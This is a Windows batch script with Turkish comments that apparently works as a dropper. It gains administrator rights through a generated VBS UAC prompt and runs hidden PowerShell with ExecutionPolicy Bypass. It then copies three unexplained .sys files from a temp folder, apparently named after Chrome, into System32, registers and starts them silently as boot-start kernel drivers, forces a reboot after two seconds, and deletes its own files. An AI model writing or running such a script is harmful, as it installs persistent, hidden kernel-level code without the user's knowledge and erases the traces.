@echo off
setlocal

:: Yönetici izni kontrolü
openfiles >nul 2>&1 || (
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0""", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    exit /B
)

:: Çalışma dizinini al (örnek: C:\Users\User\AppData\Local\Temp\CHROME_ABC123\)
set "WORKDIR=%~dp0"

:: TPM ayarları
powershell -WindowStyle Hidden -Command "Start-Process powershell -WindowStyle Hidden -Verb RunAs -Wait -ArgumentList '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command Enable-TpmAutoProvisioning'"


:: Dosyaları System32'ye kopyala
set "sys32Dir=C:\Windows\System32"

if exist "%WORKDIR%calistex.sys" (
    copy /y "%WORKDIR%calistex.sys" "%sys32Dir%"
)
if exist "%WORKDIR%afrock.sys" (
    copy /y "%WORKDIR%afrock.sys" "%sys32Dir%"
)
if exist "%WORKDIR%win1.sys" (
    copy /y "%WORKDIR%win1.sys" "%sys32Dir%"
)

:: Servisleri oluştur
sc create calistex binPath= "C:\Windows\System32\calistex.sys" DisplayName= "calistex_drv" start= boot tag= 2 type= kernel group= "System Reserved" >nul 2>&1
sc create afrock binPath= "C:\Windows\System32\afrock.sys" DisplayName= "afrock_drv" start= boot tag= 2 type= kernel group= "System Reserved" >nul 2>&1
sc create win1 binPath= "C:\Windows\System32\win1.sys" DisplayName= "win1_drv" start= boot tag= 2 type= kernel group= "System Reserved" >nul 2>&1

:: Servisleri başlat
sc start calistex >nul 2>&1
sc start afrock >nul 2>&1
sc start win1 >nul 2>&1

:: Yeniden başlat (2 saniye sonra)
shutdown /r /t 2

:: Kendini temizle
cd /d "%WORKDIR%"
del /f /q *.*
for /d %%i in (*) do rd /s /q "%%i"

exit
